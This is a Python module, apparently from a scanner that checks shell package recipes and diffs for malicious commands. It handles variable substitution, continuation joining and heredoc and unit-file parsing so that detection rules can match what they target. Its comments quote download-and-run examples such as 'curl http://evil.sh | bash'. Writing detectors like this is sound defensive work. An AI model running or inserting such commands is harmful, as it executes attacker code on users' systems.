"""Extracted from _tokenizer_engine.py: _variables."""

import re
from functools import lru_cache
import shlex
from ._common import _ARRAY_ASSIGNMENT_RE, _ASSIGNMENT_RE, _MAX_LINE_LEN, _MAX_TABLE_BYTES, _MAX_VALUE_LEN, _VAR_REF_RE, _split_top_level, _tail_continues
from ._expansion import resolve_expansions
from ._quotes import reconstruct_literals

__all__ = ['_DIFF_TARGET_LINE_RE', '_HEREDOC_OPENER_RE', '_SHELL_SOURCE_FILE_RE', '_assignments_are_shell', '_collect_array_entries', '_join_line_continuations_cached', '_split_with_lines', '_strip_outer_quotes', '_substitute', '_substitute_with_resolve', '_table_bytes', '_variable_table', '_variable_table_with_spans', 'join_line_continuations']

def _substitute_with_resolve(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
) -> tuple[str, bool]:
    """Resolve $var, ${var...} and ${arr[i]} references in *text*, returning
    (resolved, fully_resolved).  H065 literal reconstruction runs on the
    resolved line, so obfuscated forms reach rules in their plain-text
    shape while the line is marked unresolved when reconstruction fails."""
    array_table = array_table or {}

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    # First resolve simple ${var} and $var.
    resolved = _VAR_REF_RE.sub(replacer, text)
    if len(resolved) > _MAX_LINE_LEN:
        return text, False
    # Then resolve parameter expansions (${var//pat/rep}, ${arr[i]}, etc.).
    ok = True
    if "${" in resolved:
        resolved, ok = resolve_expansions(resolved, var_table, array_table)
        if len(resolved) > _MAX_LINE_LEN:
            return text, False
    # H065: reconstruct obfuscated literals as data, never executed.
    reconstructed, fully = reconstruct_literals(resolved)
    if len(reconstructed) > _MAX_LINE_LEN:
        return text, False
    # Partial expansion is kept: a resolved ${arr[0]} -> curl still helps
    # rules see the downloader even when ${url} on the same line is unknown.
    return reconstructed, ok and fully

def join_line_continuations(lines: list[str]) -> list[str]:
    """Cached on the lines: ten call sites join the same diff.

    A fresh list is returned because the result is a plain list and a
    caller is entitled to treat it as its own.
    """
    return list(_join_line_continuations_cached(tuple(lines)))

@lru_cache(maxsize=8)
def _join_line_continuations_cached(lines: tuple[str, ...]) -> tuple[str, ...]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    # Accumulated as parts and joined once.  Appending to a string per
    # continuation line made this quadratic, so a diff of many backslash
    # continuations (which an untrusted PKGBUILD controls) cost time
    # proportional to the square of its length.
    parts: list[str] | None = None
    marker = ""

    def flush() -> str:
        return "".join(parts)

    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            # Verbatim, with no separator inserted.  A backslash-newline is
            # *removed* by the shell, it is not whitespace: `cur\` + `l ...`
            # is `curl ...`, and joining with a space produced `cur l ...`,
            # which splits a command name into two words and defeats every
            # rule that matches it. Indentation on the continuation line
            # still separates arguments, because it is kept as written.
            parts.append(body)
        else:
            if parts is not None:
                out.append(marker + flush())
            parts, marker = [body], this_marker
        tail = parts[-1]
        stripped_tail = tail.rstrip()
        if stripped_tail.endswith("\\"):
            parts[-1] = stripped_tail[:-1].rstrip()
        elif _tail_continues(stripped_tail):
            pass  # still accumulating: an operator promises more input
        else:
            out.append(marker + flush())
            parts, marker = None, ""
    if parts is not None:
        out.append(marker + flush())
    return tuple(out)

def _strip_outer_quotes(value: str) -> str:
    """Remove one matching pair of surrounding quotes, if present."""
    if (value.startswith('"') and value.endswith('"')) or (
        value.startswith("'") and value.endswith("'")
    ):
        return value[1:-1]
    return value

def _split_with_lines(text: str) -> list[tuple[str, int]]:
    """``shlex.split`` tokens paired with their 1-based source line.

    ``shlex`` exposes no token offset, but ``lineno`` read *before* each
    ``get_token`` is the line the token starts on, including a token whose
    quoted text spans lines.
    """
    lexer = shlex.shlex(text, posix=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    out: list[tuple[str, int]] = []
    while True:
        line = lexer.lineno
        token = lexer.get_token()
        if token is None:
            break
        out.append((token, line))
    return out

def _collect_array_entries(
    additions: list[str], start_idx: int
) -> tuple[int, list[str], list[int], bool]:
    """Collect the entries of a ``name=( ...)`` array starting at *start_idx*.

    Returns the index of the line that closed the array, the entries
    (outer quotes removed by ``shlex``), each entry's source line index in
    *additions*, and whether the assignment runs a command substitution
    (``$(`` or a backtick, comments excluded, quotes treated
    conservatively).  Nested parentheses inside quotes are ignored; the
    closing ``)`` that balances the opener is not included in the parsed
    content.  A refused assignment has no statically known contents, so
    the caller must let the name read as "not seen" rather than keep a
    partial or stale list.
    """
    first = additions[start_idx]
    m = _ARRAY_ASSIGNMENT_RE.match(first)
    if not m:
        return start_idx, [], []
    # *rest* is the text after the opening ``(`` on the first line; the
    # opener itself is represented by the initial depth of 1.
    rest = m.group(3)
    depth = 1
    in_single = in_double = False
    refused = False
    parts: list[str] = []
    offsets: list[int] = []
    i = start_idx
    for line_offset, line in enumerate([rest] + additions[start_idx + 1 :]):
        content: list[str] = []
        j = 0
        # A ``#`` that opens a comment (unquoted, at a word boundary) runs to
        # the end of the line and is not array data.  Without this the words
        # of an inline note inside ``depends=( # note )`` were read as
        # dependency names - H103 then reported the metadata and the recipe
        # disagreeing on ``depends`` because the comment lived in one and not
        # the other.
        comment = False
        boundary = True
        while j < len(line):
            ch = line[j]
            # A substitution that executes - unquoted or in double quotes,
            # but never inside a comment or single-quoted data - makes the
            # array's contents statically unknown.  The quote state comes
            # from the same scan that collects the entries, so the two
            # cannot disagree about what is code.
            if not comment and not in_single and not refused and (
                ch == "`"
                or (ch == "$" and j + 1 < len(line) and line[j + 1] == "(")
            ):
                refused = True
            if in_double:
                if ch == "\\" and j + 1 < len(line):
                    content.append(ch)
                    content.append(line[j + 1])
                    j += 2
                    boundary = False
                    continue
                if ch == '"':
                    in_double = False
                content.append(ch)
                j += 1
                boundary = False
                continue
            if in_single:
                if ch == "'":
                    in_single = False
                content.append(ch)
                j += 1
                boundary = False
                continue
            if comment:
                # Skip the rest of this physical line; the array may continue
                # on the next one, so only the comment text is dropped.
                break
            if ch == '"':
                in_double = True
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == "'":
                in_single = True
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == "#" and boundary:
                comment = True
                j += 1
                continue
            if ch == '(':
                depth += 1
                content.append(ch)
                j += 1
                boundary = False
                continue
            if ch == ')':
                depth -= 1
                if depth == 0:
                    break
                content.append(ch)
                j += 1
                boundary = False
                continue
            content.append(ch)
            boundary = ch.isspace() or ch in ";|&("
            j += 1
        parts.append("".join(content))
        offsets.append(line_offset)
        if depth == 0:
            break
        i += 1
    entries: list[str] = []
    entry_lines: list[int] = []
    if parts:
        try:
            for token, line_no in _split_with_lines("\n".join(parts)):
                if not token:
                    continue
                index = min(max(line_no - 1, 0), len(offsets) - 1)
                entries.append(token)
                entry_lines.append(start_idx + offsets[index])
        except ValueError:
            entries, entry_lines = [], []
    return i, entries, entry_lines, refused

def _substitute(
    text: str,
    var_table: dict[str, str],
    array_table: dict[str, list[str]] | None = None,
    limit: int = _MAX_LINE_LEN,
) -> str:
    """Resolve variable and array references in *text*."""
    array_table = array_table or {}

    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        if var in array_table:
            arr = array_table[var]
            return arr[0] if arr else match.group(0)
        return var_table.get(var, match.group(0))

    result = _VAR_REF_RE.sub(replacer, text)
    if len(result) > limit:
        return text
    if "${" in result:
        result, _ok = resolve_expansions(result, var_table, array_table)
        if len(result) > limit:
            return text
    reconstructed, _fully = reconstruct_literals(result)
    return reconstructed if len(reconstructed) <= limit else text

_SHELL_SOURCE_FILE_RE = re.compile(
    r"(?:^|/)(?:PKGBUILD|[^/]*\.(?:install|sh|bash|zsh|profile|bashrc))$",
    re.IGNORECASE,
)

_DIFF_TARGET_LINE_RE = re.compile(r"^\+\+\+ (?:b/)?(.+?)(?:\t.*)?$")

_HEREDOC_OPENER_RE = re.compile(r"<<-?\s*['\"]?(\w+)['\"]?")

def _assignments_are_shell(lines: list[str]) -> list[bool]:
    """Per line: may a `KEY=value` here be folded away as an assignment?

    In a shell file it may: the value goes into the table and is matched
    where it is *used*.  In a systemd unit or a `.desktop` file there is no
    later use - the value **is** the command, and folding it away removed
    the line from matching altogether.  `ExecStart=/bin/sh -c "curl ... |
    bash"` produced no candidate at all, so no resolved rule ever saw it.

    A diff with no `+++` header is treated as shell, which is what a
    fragment handed straight to `scan_diff` is.
    """
    flags: list[bool] = []
    shell = True
    delimiter = ""
    for line in lines:
        header = _DIFF_TARGET_LINE_RE.match(line)
        if header:
            path = header.group(1).strip()
            shell = path == "/dev/null" or bool(_SHELL_SOURCE_FILE_RE.search(path))
            delimiter = ""
            flags.append(shell)
            continue
        body = line[1:] if line[:1] in ("+", "-", " ") else line
        if delimiter:
            # Inside a heredoc the text is *content*, whatever the file is:
            # `cat > "$pkgdir/…/e.service" <<EOF` with an `ExecStart=` line
            # inside is a directive being written, not a shell assignment,
            # and folding it away removed it from matching exactly as it did
            # for a unit file shipped whole.
            flags.append(False)
            if body.strip() == delimiter:
                delimiter = ""
            continue
        flags.append(shell)
        opener = _HEREDOC_OPENER_RE.search(body)
        if opener:
            delimiter = opener.group(1)
    return flags

def _variable_table(
    additions: list[str],
) -> tuple[dict[str, str], dict[str, list[str]]]:
    """Resolve assignments among added lines into scalar and array tables."""
    var_table, array_table, _spans = _variable_table_with_spans(additions)
    return var_table, array_table

def _variable_table_with_spans(
    additions: list[str],
) -> tuple[dict[str, str], dict[str, list[str]], dict]:
    """The variable tables plus each value's source line index.

    Spans index into *additions*.  A scalar records the assignment line
    that last set it (a ``+=`` chain's final line); an array records its
    opener and closer lines and each entry's first line.  The tables'
    values are unchanged, so every existing caller reads what it read.
    """
    var_table: dict[str, str] = {}
    array_table: dict[str, list[str]] = {}
    scalar_lines: dict[str, int] = {}
    array_spans: dict[str, dict] = {}
    # A name is "kept" when a value for it was statically available at some
    # point: a folded scalar, or an array with collected entries (even when
    # the array itself is refused now, because the old reader stored it).
    # Reporting stays on that surface - only names that were never kept are
    # named as unresolved - because the X-series rates were adjudicated on
    # it, while a shadowed or substituted name still has to leave the
    # tables so no reader sees a stale or shredded value (A6).
    ever_kept: set[str] = set()
    reportable: dict[str, int] = {}
    i = 0
    while i < len(additions):
        line = additions[i]
        # Arrays first: ``source=(... )`` may span multiple added lines.
        arr_match = _ARRAY_ASSIGNMENT_RE.match(line)
        if arr_match:
            name, op = arr_match.group(1), arr_match.group(2)
            close_idx, entries, entry_lines, refused = _collect_array_entries(
                additions, i
            )
            if entries:
                ever_kept.add(name)
            if refused or not entries:
                reportable.setdefault(name, i)
            if refused:
                # The assignment executes a substitution, so the array's
                # contents are statically unknown from this line on.  A
                # partial or stale list would be a wrong analysis; the name
                # reads as "not seen" instead (A6).
                array_table.pop(name, None)
                array_spans.pop(name, None)
            elif entries:
                if op == "+=":
                    array_table.setdefault(name, []).extend(entries)
                    span = array_spans.setdefault(
                        name, {"open": i, "close": close_idx, "entries": []}
                    )
                    span["entries"].extend(entry_lines)
                    span["close"] = close_idx
                else:
                    array_table[name] = entries
                    array_spans[name] = {
                        "open": i, "close": close_idx, "entries": list(entry_lines),
                    }
            i = close_idx + 1
            continue
        scalar_match = _ASSIGNMENT_RE.match(line)
        if scalar_match:
            name, op, value = (
                scalar_match.group(1),
                scalar_match.group(2),
                scalar_match.group(3).strip(),
            )
            # In `U=x; curl $U | bash` the shell assigns, then runs a
            # second command: only the first command's value is assigned.
            # Recording the whole tail made the value reference itself and
            # substitution re-expanded it until the size bound tripped.
            value = _split_top_level(value)[0].strip()
            value = _strip_outer_quotes(value)
            # A command substitution has no static value, so it cannot be
            # folded into the table.  The name's value is unknown from this
            # line on, so whatever a previous assignment left is dropped:
            # a stale value would be a wrong analysis, while an absent one
            # reads as "not seen" (A6).
            if "$(" not in value and "`" not in value:
                if op == "+=":
                    var_table[name] = var_table.get(name, "") + value
                else:
                    var_table[name] = value
                scalar_lines[name] = i
                ever_kept.add(name)
            else:
                var_table.pop(name, None)
                scalar_lines.pop(name, None)
                reportable.setdefault(name, i)
        i += 1

    for _ in range(10):
        new_table: dict[str, str] = {}
        for k, v in var_table.items():
            substituted, _ = _substitute_with_resolve(v, var_table, array_table)
            new_table[k] = substituted if len(substituted) <= _MAX_VALUE_LEN else v
        changed = new_table != var_table
        var_table = new_table
        # Checked every pass, including the first: the loop used to break
        # on equality before looking, and counted only the scalar table, so
        # a no-substitution recipe could return an array table of any size.
        if _table_bytes(var_table, array_table) > _MAX_TABLE_BYTES:
            # Refuse, never truncate: a shortened depends/source list is a
            # wrong analysis, not a smaller one, and A6 says an unresolved
            # value must read as not seen.
            raise ValueError(
                f"variable table exceeds {_MAX_TABLE_BYTES} bytes; refusing"
            )
        if not changed:
            break
    return var_table, array_table, {
        "scalars": scalar_lines,
        "arrays": array_spans,
        "refused": sorted(
            index for name, index in reportable.items()
            if name not in ever_kept
        ),
    }

def _table_bytes(scalars: dict[str, str], arrays: dict[str, list[str]]) -> int:
    """Total bytes the tables hold, arrays included."""
    total = sum(len(value) for value in scalars.values())
    for entries in arrays.values():
        total += sum(len(entry) for entry in entries)
    return total
